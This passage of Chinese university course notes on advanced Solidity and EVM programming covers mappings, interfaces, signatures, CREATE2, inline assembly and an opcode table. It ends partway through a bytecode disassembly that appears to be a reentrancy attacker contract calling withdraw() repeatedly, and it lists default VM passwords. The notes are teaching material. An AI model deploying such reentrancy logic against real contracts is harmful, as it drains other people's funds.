#                                              区块链高级编程2023       

​                                                 **南京大学普惠•三农金融科技创新研究中心    崔宇**     
                                                                  


## 预备工作

- Solidity合约IDE：Remix Online IDE https://remix.ethereum.org/    
- Remix Desktop IDE：[最简单的方法实现Remix本地化部署 | 登链社区 | 区块链技术社区 (learnblockchain.cn)](https://learnblockchain.cn/article/5238)
- Golang开发环境：Goland/vscode Golang1.17+
- **课程专用Linux虚拟机** Ubuntu20.04.5 密码：root    WeBASE密码：Root123

## Solidity智能合约基础编程

### 映射

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.7;

//Mapping demo

contract Mapping {
    mapping(address => uint) public balances;
    mapping(address => mapping(address => bool)) public relation;

    function demo() external returns(uint, uint, address, address) {
        balances[msg.sender] = 123;
        uint bal1 = balances[msg.sender];
        uint bal2 = balances[address(1)]; 
        balances[msg.sender] += 456;

        delete balances[msg.sender];

        relation[msg.sender][address(this)] = true;

        return (bal1, bal2, msg.sender, address(2));

    }
}
```

### 接口

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract TestUniswapLiquidity {
    address private constant FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    function addLiquidity(
        address _tokenA,
        address _tokenB,
        uint _amountA,
        uint _amountB
    ) external {
        IERC20(_tokenA).transferFrom(msg.sender, address(this), _amountA);
        IERC20(_tokenB).transferFrom(msg.sender, address(this), _amountB);

        IERC20(_tokenA).approve(ROUTER, _amountA);
        IERC20(_tokenB).approve(ROUTER, _amountB);

        (uint amountA, uint amountB, uint liquidity) = IUniswapV2Router(ROUTER)
            .addLiquidity(
                _tokenA,
                _tokenB,
                _amountA,
                _amountB,
                1,
                1,
                address(this),
                block.timestamp
            );
    }

    function removeLiquidity(address _tokenA, address _tokenB) external {
        address pair = IUniswapV2Factory(FACTORY).getPair(_tokenA, _tokenB);

        uint liquidity = IERC20(pair).balanceOf(address(this));
        IERC20(pair).approve(ROUTER, liquidity);

        (uint amountA, uint amountB) = IUniswapV2Router(ROUTER).removeLiquidity(
            _tokenA,
            _tokenB,
            liquidity,
            1,
            1,
            address(this),
            block.timestamp
        );
    }
}

interface IUniswapV2Router {
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    )
        external
        returns (
            uint amountA,
            uint amountB,
            uint liquidity
        );

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
}

interface IUniswapV2Factory {
    function getPair(address token0, address token1) external view returns (address);
}

interface IERC20 {
    function totalSupply() external view returns (uint);

    function balanceOf(address account) external view returns (uint);

    function transfer(address recipient, uint amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint amount
    ) external returns (bool);
}

```

### 合约调用

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.10;

contract Callee {
    uint public x;
    uint public value;

    function setX(uint _x) public returns (uint) {
        x = _x;
        return x;
    }

    function setXandSendEther(uint _x) public payable returns (uint, uint) {
        x = _x;
        value = msg.value;

        return (x, value);
    }
}


contract Caller {
    function setX(Callee _callee, uint _x) public {
        uint x = _callee.setX(_x);
    }

    function setXFromAddress(address _addr, uint _x) public {
        Callee callee = Callee(_addr);
        callee.setX(_x);
    }

    function setXandSendEther(Callee _callee, uint _x) public payable {
        (uint x, uint value) = _callee.setXandSendEther{value: msg.value}(_x);
    }
}

```

### 密码学

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

/* Signature Verification

How to Sign and Verify
# Signing
1. Create message to sign
2. Hash the message
3. Sign the hash (off chain, keep your private key secret)

# Verify
1. Recreate hash from the original message
2. Recover signer from signature and hash
3. Compare recovered signer to claimed signer
*/

contract VerifySignature {
    /* 1. Unlock MetaMask account
    ethereum.enable()
    */

    /* 2. Get message hash to sign
    getMessageHash(
        0x14723A09ACff6D2A60DcdF7aA4AFf308FDDC160C,
        123,
        "coffee and donuts",
        1
    )

    hash = "0xcf36ac4f97dc10d91fc2cbb20d718e94a8cbfe0f82eaedc6a4aa38946fb797cd"
    */
    function getMessageHash(
        address _to,
        uint _amount,
        string memory _message,
        uint _nonce
    ) public pure returns (bytes32) {
        return keccak256(abi.encodePacked(_to, _amount, _message, _nonce));
    }

    /* 3. Sign message hash
    # using browser
    account = "copy paste account of signer here"
    ethereum.request({ method: "personal_sign", params: [account, hash]}).then(console.log)

    # using web3
    web3.personal.sign(hash, web3.eth.defaultAccount, console.log)

    Signature will be different for different accounts
    0x993dab3dd91f5c6dc28e17439be475478f5635c92a56e17e82349d3fb2f166196f466c0b4e0c146f285204f0dcb13e5ae67bc33f4b888ec32dfe0a063e8f3f781b
    */
    function getEthSignedMessageHash(bytes32 _messageHash)
        public
        pure
        returns (bytes32)
    {
        /*
        Signature is produced by signing a keccak256 hash with the following format:
        "\x19Ethereum Signed Message\n" + len(msg) + msg
        */
        return
            keccak256(
                abi.encodePacked("\x19Ethereum Signed Message:\n32", _messageHash)
            );
    }

    /* 4. Verify signature
    signer = 0xB273216C05A8c0D4F0a4Dd0d7Bae1D2EfFE636dd
    to = 0x14723A09ACff6D2A60DcdF7aA4AFf308FDDC160C
    amount = 123
    message = "coffee and donuts"
    nonce = 1
    signature =
        0x993dab3dd91f5c6dc28e17439be475478f5635c92a56e17e82349d3fb2f166196f466c0b4e0c146f285204f0dcb13e5ae67bc33f4b888ec32dfe0a063e8f3f781b
    */
    function verify(
        address _signer,
        address _to,
        uint _amount,
        string memory _message,
        uint _nonce,
        bytes memory signature
    ) public pure returns (bool) {
        bytes32 messageHash = getMessageHash(_to, _amount, _message, _nonce);
        bytes32 ethSignedMessageHash = getEthSignedMessageHash(messageHash);

        return recoverSigner(ethSignedMessageHash, signature) == _signer;
    }

    function recoverSigner(bytes32 _ethSignedMessageHash, bytes memory _signature)
        public
        pure
        returns (address)
    {
        (bytes32 r, bytes32 s, uint8 v) = splitSignature(_signature);

        return ecrecover(_ethSignedMessageHash, v, r, s);
    }

    function splitSignature(bytes memory sig)
        public
        pure
        returns ( 
            bytes32 r,
            bytes32 s,
            uint8 v
        )
    {
        require(sig.length == 65, "invalid signature length");

        assembly {
            /*
            First 32 bytes stores the length of the signature

            add(sig, 32) = pointer of sig + 32
            effectively, skips first 32 bytes of signature

            mload(p) loads next 32 bytes starting at the memory address p into memory
            */

            // first 32 bytes, after the length prefix
            r := mload(add(sig, 32))
            // second 32 bytes
            s := mload(add(sig, 64))
            // final byte (first byte of the next 32 bytes)
            v := byte(0, mload(add(sig, 96)))
        }

        // implicitly return (r, s, v)
    }
}

```

### 可预测合约创建

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract Car {
    address public owner;

    constructor(address _owner) payable {
        owner = _owner;
    }
}

contract CarFactory {
    Car[] public cars;
    
    event Deploy(address addr);
    function create(address _owner) public {
        Car car = new Car(_owner);
        cars.push(car);
    }

    function create2(
        address _owner,
        uint _salt
    ) public {
        Car car = (new Car){salt: bytes32(_salt)}(_owner);
        cars.push(car);
        emit Deploy(address(car));
    }

    function createAndSendEther(address _owner) public payable {
        Car car = (new Car){value: msg.value}(_owner);
        cars.push(car);
    }

    function create2AndSendEther(
        address _owner,
        bytes32 _salt
    ) public payable {
        Car car = (new Car){value: msg.value, salt: _salt}(_owner);
        cars.push(car);
    }

    function getCar(uint _index)
        public
        view
        returns (
            address owner,
            uint balance
        )
    {
        Car car = cars[_index];

        return (car.owner(), address(car).balance);
    }  

    function getAddress(bytes memory bytecode, uint _salt) public
    view returns (address)
    {
        bytes32 hash = keccak256(
            abi.encodePacked(
                bytes1(0xff), address(this), _salt, keccak256(bytecode)
            )
        );
        return address(uint160(uint(hash)));
    }
    function getBytecode(address _owner)public pure returns (bytes memory) {
        bytes memory bytecode = type(Car).creationCode;
        return abi.encodePacked(bytecode, abi.encode(_owner));
    }
    //智能合约逆向：https://ethervm.io/decompile

}

```

### ABI解码

![image](https://user-images.githubusercontent.com/87604354/211181828-faf79c53-a7f2-488e-979b-60a937218bb7.png)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract AbiDecode {
    struct MyStruct {
        string name;
        uint[2] nums;
    }

    function encode(
        uint x,
        address addr,
        uint[] calldata arr,
        MyStruct calldata myStruct
    ) external pure returns (bytes memory) {
        return abi.encode(x, addr, arr, myStruct);
    }

    function decode(bytes calldata data)
        external
        pure
        returns (
            uint x,
            address addr,
            uint[] memory arr,
            MyStruct memory myStruct
        )
    {
        (x, addr, arr, myStruct) = abi.decode(data, (uint, address, uint[], MyStruct));
    }
   
}
```



## Solidity智能合约高阶编程

### Solidity内联汇编(assembly)

在编写合约时，得益于汇编可以直接与EVM交互，有时候需要使用汇编来帮助我们完成Solidity没法完成的事情。

汇编语言指使用汇编器转换为机器代码的低级编程语言。 汇编语言与物理机或虚拟机绑定，因为它们实现了指令集。 

```cpp
#include<iostream>
using namespace std;

int main() {
00AF2540  push        ebp  
00AF2541  mov         ebp,esp  
00AF2543  sub         esp,0C0h  
00AF2549  push        ebx  
00AF254A  push        esi  
00AF254B  push        edi  
00AF254C  mov         edi,ebp  
00AF254E  xor         ecx,ecx  
00AF2550  mov         eax,0CCCCCCCCh  
00AF2555  rep stos    dword ptr es:[edi]  
00AF2557  mov         ecx,offset _78F11423_源@cpp (0AFF067h)  
00AF255C  call        @__CheckForDebuggerJustMyCode@4 (0AF137Fh)  
	cout << "区块链高级编程2023" << endl;
00AF2561  mov         esi,esp  
00AF2563  push        offset std::endl<char,std::char_traits<char> > (0AF103Ch)  
00AF2568  push        offset string "\xc7\xf8\xbf\xe9\xc1\xb4\xb8\xdf\xbc\xb6\xb1\xe0\xb3\xcc2023" (0AF9B30h)  
00AF256D  mov         eax,dword ptr [__imp_std::cout (0AFD0D4h)]  
00AF2572  push        eax  
00AF2573  call        std::operator<<<std::char_traits<char> > (0AF11A9h)  
00AF2578  add         esp,8  
00AF257B  mov         ecx,eax  
00AF257D  call        dword ptr [__imp_std::basic_ostream<char,std::char_traits<char> >::operator<< (0AFD0A0h)]  
00AF2583  cmp         esi,esp  
00AF2585  call        __RTC_CheckEsp (0AF128Fh)  
	return 0;
00AF258A  xor         eax,eax  
}
00AF258C  pop         edi  
00AF258D  pop         esi  
00AF258E  pop         ebx  
00AF258F  add         esp,0C0h  
00AF2595  cmp         ebp,esp  
00AF2597  call        __RTC_CheckEsp (0AF128Fh)  
00AF259C  mov         esp,ebp  
00AF259E  pop         ebp  
00AF259F  ret  
```

以太坊虚拟机EVM有自己的指令集，该指令集中目前包含了 144个操作码，这些指令被Solidity语言抽象之后，用来编写智能合约。但是Solidity 也支持使用内联汇编。

```solidity
contract Assembler{
    function do_EVM() public {
        assembly {
         //start writing evm assembler language
         
        }
    }
}
```

使用内联汇编的意义：

- 细粒度控制：可以使用操作码直接与EVM进行交互。 这使的可以对智能合约要执行的操作进行更精细控制。

- 额外的控制权：汇编提供了更多控制权来执行某些仅靠Solidity不可能实现的逻辑。Solidity中该模块的作者给出如下分析：

  （1）string bytes：内联汇编允许在单个操作中从数据类型中读取完整字（256 位）。Solidity-stringutils使用这种特权来做非常快速的字符串比较，具体方法是对要比较的两个字符串的32字节块进行减法。如果没有汇编，您必须逐字节进行此操作。
  （2）sha3：操作码将内存中的字节范围用于哈希，而同名的Solidity函数采用字符串。因此，对字符串的一部分进行哈希处理需要昂贵的字符串复制操作。使用内联程序集，可以传入字符串并仅对关心的位进行hash操作。

  （3）bytes string：Solidity不支持从返回可变长度类型（如动态数组）的外部函数获取返回值，但是如果知道预期的长度，则可以使用内联汇编调用它们。

- 减少Gas消耗

  ```solidity
  pragma solidity 0.8.7;
  contract CompareSolandAssem {
      //正常方法 消耗gas: 22313
      function addSolidity(uint x, uint y) public pure returns (uint) {
          return x + y;
      }
      //内联汇编 消耗gas: 21915
      function addAssembly(uint x, uint y) public pure returns (uint) {
          assembly {
              let result := add(x, y)
              mstore(0x0, result) // 在内存中保存结果 0x0为内存地址
              return(0x0, 32)     // 从内存地址0x0返回32字节
          }
      }
  }
  ```

![image](https://user-images.githubusercontent.com/87604354/211181843-17f09a87-7b63-4839-a603-15062f3b6ca6.png)

  汇编代码块之间不能通信，也就是说在 一个汇编代码块里定义的变量，在另一个汇编代码块中不可以被访问。

  在内联汇编代码块中，使用`let`关键字定义变量。使用`:=`操作符给变量赋值，如果没有使用`:=`操作符给变量赋值，那么该变量自动初始化为0值：

  在EVM的内部，`let`指令执行如下任务：

  - 创建一个新的堆栈槽位
  - 为变量保留该槽位
  - 当到达代码块结束时自动销毁该槽位

  因此，使用let指令在汇编代码块中定义的变量，在该代码块外部是无法访问的。

  

  在Solidity汇编中字面量的写法与Solidity一致。不过，字符串字面量最多可以包含32个字符。

  ```solidity
  pragma solidity 0.8.7;
  contract demoAssembly {
      function assemblyTest() public {
          assembly { 
              let a := 0x123             // 16进制
              let b := 42                // 10进制
              let c := "hello world"     // 字符串
            //let d := "very long string more than 32 bytes" // 超长字符串，编译时报错
              let e                      // 自动初始化为0
              e := 1 
          }
      }
    
  }
  ```

  （内联汇编的条件分支语句和循环语句略）

  

  EVM操作码(Opcodes)：

  | Instruction                                  |      |      | Explanation                                                  |
  | -------------------------------------------- | ---- | ---- | ------------------------------------------------------------ |
  | stop()                                       | -    | F    | stop execution, identical to return(0, 0)                    |
  |                                              |      |      |                                                              |
  | add(x, y)                                    |      | F    | x + y                                                        |
  | sub(x, y)                                    |      | F    | x - y                                                        |
  | mul(x, y)                                    |      | F    | x * y                                                        |
  | div(x, y)                                    |      | F    | x / y or 0 if y == 0                                         |
  | sdiv(x, y)                                   |      | F    | x / y, for signed numbers in two’s complement, 0 if y == 0   |
  | mod(x, y)                                    |      | F    | x % y, 0 if y == 0                                           |
  | smod(x, y)                                   |      | F    | x % y, for signed numbers in two’s complement, 0 if y == 0   |
  | exp(x, y)                                    |      | F    | x to the power of y                                          |
  | not(x)                                       |      | F    | bitwise “not” of x (every bit of x is negated)               |
  | lt(x, y)                                     |      | F    | 1 if x < y, 0 otherwise                                      |
  | gt(x, y)                                     |      | F    | 1 if x > y, 0 otherwise                                      |
  | slt(x, y)                                    |      | F    | 1 if x < y, 0 otherwise, for signed numbers in two’s complement |
  | sgt(x, y)                                    |      | F    | 1 if x > y, 0 otherwise, for signed numbers in two’s complement |
  | eq(x, y)                                     |      | F    | 1 if x == y, 0 otherwise                                     |
  | iszero(x)                                    |      | F    | 1 if x == 0, 0 otherwise                                     |
  | and(x, y)                                    |      | F    | bitwise “and” of x and y                                     |
  | or(x, y)                                     |      | F    | bitwise “or” of x and y                                      |
  | xor(x, y)                                    |      | F    | bitwise “xor” of x and y                                     |
  | byte(n, x)                                   |      | F    | nth byte of x, where the most significant byte is the 0th byte |
  | shl(x, y)                                    |      | C    | logical shift left y by x bits                               |
  | shr(x, y)                                    |      | C    | logical shift right y by x bits                              |
  | sar(x, y)                                    |      | C    | signed arithmetic shift right y by x bits                    |
  | addmod(x, y, m)                              |      | F    | (x + y) % m with arbitrary precision arithmetic, 0 if m == 0 |
  | mulmod(x, y, m)                              |      | F    | (x * y) % m with arbitrary precision arithmetic, 0 if m == 0 |
  | signextend(i, x)                             |      | F    | sign extend from (i*8+7)th bit counting from least significant |
  | keccak256(p, n)                              |      | F    | keccak(mem[p…(p+n)))                                         |
  | pc()                                         |      | F    | current position in code                                     |
  | pop(x)                                       | -    | F    | discard value x                                              |
  | mload(p)                                     |      | F    | mem[p…(p+32))                                                |
  | mstore(p, v)                                 | -    | F    | mem[p…(p+32)) := v                                           |
  | mstore8(p, v)                                | -    | F    | mem[p] := v & 0xff (only modifies a single byte)             |
  | sload(p)                                     |      | F    | storage[p]                                                   |
  | sstore(p, v)                                 | -    | F    | storage[p] := v                                              |
  | msize()                                      |      | F    | size of memory, i.e. largest accessed memory index           |
  | gas()                                        |      | F    | gas still available to execution                             |
  | address()                                    |      | F    | address of the current contract / execution context          |
  | balance(a)                                   |      | F    | wei balance at address a                                     |
  | selfbalance()                                |      | I    | equivalent to balance(address()), but cheaper                |
  | caller()                                     |      | F    | call sender (excluding `delegatecall`)                       |
  | callvalue()                                  |      | F    | wei sent together with the current call                      |
  | calldataload(p)                              |      | F    | call data starting from position p (32 bytes)                |
  | calldatasize()                               |      | F    | size of call data in bytes                                   |
  | calldatacopy(t, f, s)                        | -    | F    | copy s bytes from calldata at position f to mem at position t |
  | codesize()                                   |      | F    | size of the code of the current contract / execution context |
  | codecopy(t, f, s)                            | -    | F    | copy s bytes from code at position f to mem at position t    |
  | extcodesize(a)                               |      | F    | size of the code at address a                                |
  | extcodecopy(a, t, f, s)                      | -    | F    | like codecopy(t, f, s) but take code at address a            |
  | returndatasize()                             |      | B    | size of the last returndata                                  |
  | returndatacopy(t, f, s)                      | -    | B    | copy s bytes from returndata at position f to mem at position t |
  | extcodehash(a)                               |      | C    | code hash of address a                                       |
  | create(v, p, n)                              |      | F    | create new contract with code mem[p…(p+n)) and send v wei and return the new address |
  | create2(v, p, n, s)                          |      | C    | create new contract with code mem[p…(p+n)) at address keccak256(0xff . this . s . keccak256(mem[p…(p+n))) and send v wei and return the new address, where `0xff` is a 1 byte value, `this` is the current contract’s address as a 20 byte value and `s` is a big-endian 256-bit value |
  | call(g, a, v, in, insize, out, outsize)      |      | F    | call contract at address a with input mem[in…(in+insize)) providing g gas and v wei and output area mem[out…(out+outsize)) returning 0 on error (eg. out of gas) and 1 on success |
  | callcode(g, a, v, in, insize, out, outsize)  |      | F    | identical to `call` but only use the code from a and stay in the context of the current contract otherwise |
  | delegatecall(g, a, in, insize, out, outsize) |      | H    | identical to `callcode` but also keep `caller` and `callvalue` |
  | staticcall(g, a, in, insize, out, outsize)   |      | B    | identical to `call(g, a, 0, in, insize, out, outsize)` but do not allow state modifications |
  | return(p, s)                                 | -    | F    | end execution, return data mem[p…(p+s))                      |
  | revert(p, s)                                 | -    | B    | end execution, revert state changes, return data mem[p…(p+s)) |
  | selfdestruct(a)                              | -    | F    | end execution, destroy current contract and send funds to a  |
  | invalid()                                    | -    | F    | end execution with invalid instruction                       |
  | log0(p, s)                                   | -    | F    | log without topics and data mem[p…(p+s))                     |
  | log1(p, s, t1)                               | -    | F    | log with topic t1 and data mem[p…(p+s))                      |
  | log2(p, s, t1, t2)                           | -    | F    | log with topics t1, t2 and data mem[p…(p+s))                 |
  | log3(p, s, t1, t2, t3)                       | -    | F    | log with topics t1, t2, t3 and data mem[p…(p+s))             |
  | log4(p, s, t1, t2, t3, t4)                   | -    | F    | log with topics t1, t2, t3, t4 and data mem[p…(p+s))         |
  | chainid()                                    |      | I    | ID of the executing chain (EIP 1344)                         |
  | origin()                                     |      | F    | transaction sender                                           |
  | gasprice()                                   |      | F    | gas price of the transaction                                 |
  | blockhash(b)                                 |      | F    | hash of block nr b - only for last 256 blocks excluding current |
  | coinbase()                                   |      | F    | current mining beneficiary                                   |
  | timestamp()                                  |      | F    | timestamp of the current block in seconds since the epoch    |
  | number()                                     |      | F    | current block number                                         |
  | difficulty()                                 |      | F    | difficulty of the current block                              |
  | gaslimit()                                   |      | F    | block gas limit of the current block                         |
  | datasize()                                   |      |      | can only take string literals (the names of other objects) as arguments and return the size and offset in the data area, respectively. For the EVM, the function is equivalent to `dataoffset datacopy codecopy` |

应用内联汇编的实例：用户数据签名校验工具合约库

```solidity
pragma solidity ^0.8.7;
//根据数据的签名和sha3哈希值，可以依靠ecrecover函数得到账户公钥对应的地址，从而与原地址对比，进行校验
contract ECDSA {
    function retLen(bytes memory signature) public pure returns (uint256) {
        return signature.length;
    }
    function recover(bytes32 hash, bytes memory signature) public pure returns (address)
    {
        bytes32 r;
        bytes32 s;
        uint8 v;

        //Check the signature length
        if (signature.length != 65) {
            return (address(0));
        }

        assembly {
            r := mload(add(signature, 32))
            s := mload(add(signature, 64))
            v := byte(0, mload(add(signature, 96)))
        }

        // Version of signature should be 27 or 28, but 0 and 1 are also possible versions
        if (v < 27) {
            v += 27;
        }

        // If the version is correct return the signer address
        if (v != 27 && v != 28) {
            return (address(0));
        } else {
            return ecrecover(hash, v, r, s);
        }
  }
        // ecrecover(bytes32 hash, uint8 v, bytes32 r, bytes32 s) returns (address)
        // 从椭圆曲线签名中恢复与公钥关联的地址,出错时则返回0。函数参数对应签名的ECDSA值:
        // r = 签名的前32个字节
        // s = 签名的次32个字节(即第33-64字节)
        // v = 签名的最后一个字节
        // ecrecover 返回是address，不是payable address，如果需要向返回的address进行资金转账，需要转成 payable address。

}

// var account = web3.eth.accounts[0];
// var sha3Msg = web3.sha3("abc");
// var signedData = web3.eth.sign(account, sha3Msg);

// account: 0x60320b8a71bc314404ef7d194ad8cac0bee1e331
// sha3(message): 0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45
// Signed data: 0xf4128988cbe7df8315440adde412a8955f7f5ff9a5468a791433727f82717a6753bd71882079522207060b681fbd3f5623ee7ed66e33fc8e581f442acbcf6ab800

```

![image](https://user-images.githubusercontent.com/87604354/211181852-34ab25d5-d4e5-4a0b-9a8e-def210910f83.png)

### 智能合约逆向技术——优化智能合约的基础

智能合约大多数代码不公开源码，公开字节码，所以需要使用逆向工具或者人工进行逆向分析。

#### 深入理解EVM操作码

 任何一个区块链都是一个基于交易的状态机。 区块链递增地执行交易，交易完成后就变成新状态。因此，区块链上的每笔交易都是一次*状态转换*。简单的区块链，如比特币，本身只支持简单的交易传输。相比之下，可以运行智能合约的链，如以太坊，实现了两种类型的账户，即外部账户和智能合约账户，所以支持复杂的逻辑。外部账户由用户通过私钥控制，不包含代码；而只能合约账户仅受其关联的代码控制。EVM 代码以[字节码](https://en.wikipedia.org/wiki/Bytecode)的形式存储在虚拟ROM 中。

EVM 负责区块链上所有交易的执行和处理。它是一个栈机器，栈上的每个元素长度都是 256 位或 32 字节。EVM 嵌在每个以太坊节点中，负责执行合约的字节码。

EVM 把数据保存在 **存储（Storage）** 和 ***内存（Memory）*** 中。**存储（Storage）**用于永久存储数据，而**内存（Memory）**仅在函数调用期间保存数据。还有一个地方保存了函数参数，叫做**调用数据（calldata）**，这种存储方式有点像内存，不同的是不可以修改这类数据。

智能合约是用高级语言编写的，例如 Solidity、Vyper 或 Yul，随后通过编译器编译成 EVM 字节码。但是，有时直接在代码中使用字节码会更高效（省gas）。

所有以太坊字节码都可以分解为一系列操作数和操作码。操作码是一些预定义的操作指令，EVM 识别后能够执行这个操作。例如，ADD 操作码在 EVM 字节码中表示为 0x01。它从栈中删除两个元素并把结果压入栈中。

从堆栈中移除和压入堆栈的元素数量取决于操作码。例如，PUSH 操作码有 32 个：PUSH1 到 PUSH32。 PUSH 在栈上 *添加一个* 字节元素，元素的大小可以从 0 到 32 字节。它不会从栈中删除元素。作为对比, 操作码 ADDMOD 表示 [模加法运算](https://libraryguides.centennialcollege.ca/c.php?g=717548&p=5121840#:~:text=Properties of addition in modular,%2B d ( mod N ) .) ，它从栈中删除3个元素然后压入模加结果。请注意，PUSH 操作码是唯一带有操作数的操作码。

```json
PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x4C9 CODESIZE SUB DUP1 PUSH2 0x4C9 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x32 SWAP2 SWAP1 PUSH2 0xDB JUMP JUMPDEST DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x108 JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xA8 DUP3 PUSH2 0x7D JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xB8 DUP2 PUSH2 0x9D JUMP JUMPDEST DUP2 EQ PUSH2 0xC3 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0xD5 DUP2 PUSH2 0xAF JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xF1 JUMPI PUSH2 0xF0 PUSH2 0x78 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0xFF DUP5 DUP3 DUP6 ADD PUSH2 0xC6 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x3B2 DUP1 PUSH2 0x117 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x38 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x12065FE0 EQ PUSH2 0x102 JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x12D JUMPI DUP1 PUSH4 0xACD2E6E5 EQ PUSH2 0x137 JUMPI PUSH2 0x39 JUMP JUMPDEST JUMPDEST PUSH8 0xDE0B6B3A7640000 PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE LT PUSH2 0x100 JUMPI PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3CCFD60B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xE7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xFB JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x10E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x117 PUSH2 0x162 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x124 SWAP2 SWAP1 PUSH2 0x2C7 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x135 PUSH2 0x16A JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x143 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x14C PUSH2 0x28A JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x159 SWAP2 SWAP1 PUSH2 0x361 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 SELFBALANCE SWAP1 POP SWAP1 JUMP JUMPDEST PUSH8 0xDE0B6B3A7640000 CALLVALUE LT ISZERO PUSH2 0x17F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD0E30DB0 PUSH8 0xDE0B6B3A7640000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1EF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x203 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 